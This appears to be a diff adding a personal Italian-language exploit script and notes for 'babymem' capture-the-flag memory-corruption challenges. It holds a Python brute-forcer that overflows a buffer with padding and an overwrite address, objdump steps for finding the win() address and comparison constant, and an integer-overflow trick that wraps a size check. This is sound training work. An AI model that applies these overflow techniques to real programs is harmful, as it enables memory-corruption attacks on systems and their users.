@@ -1,17 +1,60 @@
-lvl 1.0
-40
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (40 a)
+------------ script.py ------------------
 
-LVL 1.1
-1000
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa... (1000 a)
+import subprocess
+
+output = ''
+size = 1
+ret = b'\x80\x1e\x40' #cambia con ciò che ti interessa
+
+while('pwn' not in output):
+    #Interrompe se il size diventa troppo grande
+    if (size > 300):
+        break
+    out = bytearray();
+
+    #aggiunge all'inizio dell'input la dimensione del buffer
+    out += bytes(str(size + len(ret)) + '\n','utf-8')
+
+    #aggiunge 'size' di offset
+    for x in range(size):
+        out += b'a'
+
+    #aggiunge alla fine l'indirizzo di win o la variabile con cui devi sovrascrivere
+    out += ret
+
+    f = open('input', 'wb')
+    f.write(out)
+
+    input_file = open('input', 'r')
+    # Run the command and capture its output
+    process = subprocess.Popen(['/challenge/babymem_level3.1'], stdout=subprocess.PIPE, stdin=input_file)
+
+    # Read the output from stdout
+    output = process.communicate()[0]
+
+    # Decode the output from bytes to string
+    output = output.decode('utf-8')
+    size += 1
+    process.kill()
+
+print(output)
+
+
+------------------------------------------------------------------------------------------------------------
+Per trovare la variabile da mettere:
+
+objdump -d /challenge/babymem_levelx.x > analysis.txt
+"ctrl + f" in analysis.txt, cerca "cmp" (troverai un'istruzione tipo cmp $0x617fda6f,%eax), quel 0x617fda6f è la variabile da mettere
+
+
+Per trovare l'indirizzo di win():
+
+objdump -d /challenge/babymem_levelx.x > analysis.txt
+"ctrl + f" in analysis.txt, cerca "<win>" e guarda a che indirizzo è
+
+[es 5.0 5.1] (funziona solo con 4 pacchetti boh)
+Viene fatta la moltiplicazione tra il numero di pacchetti e la dimensione del singolo pacchetto.
+Poi viene fatto il check sui 4 byte meno significativi del prodotto risultante: se sono meno di 8 byte li accetta
+Quindi se gli dai un totale di 0x0000000100000004 (4294967300 decimale) byte li vede come se fossero 4.
+Scegli 4 pacchetti e dagli 4294967300/4 byte: 1073741825 (sostituisci direttamente nello script python)
+poi la solita roba dello script
